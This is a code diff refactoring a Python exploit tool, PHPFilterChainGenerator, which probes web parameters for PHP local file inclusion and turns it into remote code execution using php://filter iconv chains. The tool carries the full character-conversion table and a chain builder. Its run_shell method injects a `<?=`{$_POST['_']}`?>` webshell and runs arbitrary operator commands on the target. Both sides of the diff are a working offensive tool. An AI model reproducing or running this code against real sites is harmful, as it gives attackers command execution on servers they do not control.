@@ -1,26 +1,20 @@
-
-import re
 import os
+import re
 import base64
-import urllib
 import random
 import string
-import requests
+import urllib
+import urllib.parse
 
 from rich.console import Console
-from prompt_toolkit import PromptSession
-from prompt_toolkit.formatted_text import HTML
-from prompt_toolkit.history import InMemoryHistory
-from urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+from core.base import BaseChecker
 
-class PHPFilterChainGenerator:
+
+class PHPFilterChainGenerator(BaseChecker):
 
     def __init__(self, url, silent=False):
-        self.console = Console()
-        self.url = self.ensure_correct_protocol(url)
-        self.silent = silent
+        super().__init__(url, silent)
         self.file_to_use = "php://temp"
         self.string = self._generate_random_string()
         self.conversions = {
@@ -58,8 +52,8 @@ class PHPFilterChainGenerator:
             'k': 'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2',
             'L': 'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC',
             'l': 'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE',
-            'M':'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
-            'm':'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
+            'M': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T',
+            'm': 'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949',
             'N': 'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4',
             'n': 'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61',
             'O': 'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775',
@@ -94,22 +88,9 @@ class PHPFilterChainGenerator:
             (self.generate_filter_chain(f"<?php echo '{self.string}'; ?>"), re.compile(fr'{self.string}')),
         ]
 
-    def ensure_correct_protocol(self, url):
-        if not url.startswith(('http://', 'https://')):
-            try:
-                requests.get('https://' + url, timeout=3, verify=False)
-                return 'https://' + url
-            except requests.exceptions.RequestException:
-                try:
-                    requests.get('http://' + url, timeout=3, verify=False)
-                    return 'http://' + url
-                except requests.exceptions.RequestException:
-                    pass
-        return url
-    
     def _generate_random_string(self, length=6):
         return ''.join(random.choice(string.ascii_letters) for _ in range(length))
-    
+
     def generate_filter_chain(self, chain):
         chain = chain.encode('utf-8')
         chain = base64.b64encode(chain).decode('utf-8').replace("=", "")
@@ -123,38 +104,29 @@ class PHPFilterChainGenerator:
             filters += "convert.base64-decode|"
             filters += "convert.base64-encode|"
             filters += "convert.iconv.UTF8.UTF7|"
-            
-        filters += "convert.base64-decode"    
+
+        filters += "convert.base64-decode"
         final_payload = f"php://filter/{filters}/resource={self.file_to_use}"
         return final_payload
 
-        
     def filter_check(self):
         console = Console()
         parsed_url = urllib.parse.urlparse(self.url)
         params = urllib.parse.parse_qs(parsed_url.query)
         file_paths = self.LFI_TEST_FILES
 
-        return self._scan(params, file_paths, parsed_url, console) 
-    
-    def _scan(self, params, file_paths, parsed_url, console):
+        return self._scan(params, file_paths, parsed_url, console)
 
+    def _scan(self, params, file_paths, parsed_url, console):
         for param_name in params.keys():
             for i, (file_path, file_regex) in enumerate(file_paths):
                 new_params = params.copy()
                 new_params[param_name] = file_path
                 new_query = urllib.parse.urlencode(new_params, doseq=True)
                 fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
-                
-                try:
-                    response = requests.get(fuzzed_url, timeout=5, verify=False)
-                except requests.exceptions.ConnectionError:
-                    if not self.silent:
-                        self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
-                    return False, None
-                except requests.exceptions.RequestException:
-                    if not self.silent:
-                        self.console.print("[bold red]Request Timeout Error (WAF or down host)...[/bold red]")
+
+                response = self._safe_get(fuzzed_url)
+                if response is None:
                     return False, None
 
                 match = file_regex.search(response.text)
@@ -164,40 +136,40 @@ class PHPFilterChainGenerator:
                     self.success_depth = i
                     self.base64_content = match.group(0)
                     return True, param_name
-                
-        return False, None        
-                
+
+        return False, None
+
     def run_shell(self, param_name):
+        """Custom shell - builds filter chain per command and uses POST data."""
         self.silent = True
         if not param_name:
             self.console.print("[bold red]No valid parameter name provided.[/bold red]")
             return
-        
+
         result, _ = self.filter_check()
         if not result:
             self.console.print("[bold red]LFI2RCE not detected or not exploitable.[/bold red]")
             return
 
         self.console.print("[bold yellow]Interactive shell is ready. Type your commands.[/bold yellow]")
-        
-            
-        session = PromptSession(history=InMemoryHistory())        
+
+        from prompt_toolkit import PromptSession
+        from prompt_toolkit.formatted_text import HTML
+        from prompt_toolkit.history import InMemoryHistory
+
+        session = PromptSession(history=InMemoryHistory())
         while True:
             try:
                 cmd = session.prompt(HTML('<ansired><b># </b></ansired>'))
-
-                if "exit" in cmd:
+                if not cmd:
+                    continue
+                if cmd.strip().lower() in ("exit", "quit"):
                     raise KeyboardInterrupt
-                elif not cmd:
-                    continue
-                elif "clear" in cmd:
-                    if os.name == 'posix':
-                        os.system('clear')
-                    elif os.name == 'nt':
-                        os.system('cls')
+                if cmd.strip().lower() in ("clear", "cls"):
+                    os.system("cls" if os.name == "nt" else "clear")
                     continue
 
-                cmd = f"echo [S]; {cmd};echo [E]"
+                shell_cmd = f"echo [S]; {cmd};echo [E]"
 
                 shell_code = self.generate_filter_chain("<?=`{$_POST['_']}`?>")
                 parsed_url = urllib.parse.urlparse(self.url)
@@ -207,10 +179,8 @@ class PHPFilterChainGenerator:
                 new_query = urllib.parse.urlencode(new_params, doseq=True)
                 fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
 
-                try:
-                    response = requests.post(fuzzed_url, data={"_": cmd}, verify=False)    
-                except requests.exceptions.ConnectionError:
-                    self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
+                response = self._safe_post(fuzzed_url, data={"_": shell_cmd})
+                if response is None:
                     continue
 
                 pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL)
@@ -220,11 +190,11 @@ class PHPFilterChainGenerator:
                     self.console.print(f"[bold green]{shell_output}[/bold green]")
                 else:
                     self.console.print("[bold red]No shell output.[/bold red]")
-                    
+
             except KeyboardInterrupt:
-                    self.console.print("[bold yellow][!] Exiting shell...[/bold yellow]")
-                    break        
-                  
+                self.console.print("[bold yellow][!] Exiting shell...[/bold yellow]")
+                break
+
 
 def main():
     url = input('Enter site URL to test: ')
@@ -233,7 +203,6 @@ def main():
     print(f"LFI detected: {result}")
     if result:
         checker.run_shell(param_name)
-        
+
 if __name__ == '__main__':
-    main() 
- 
+    main()
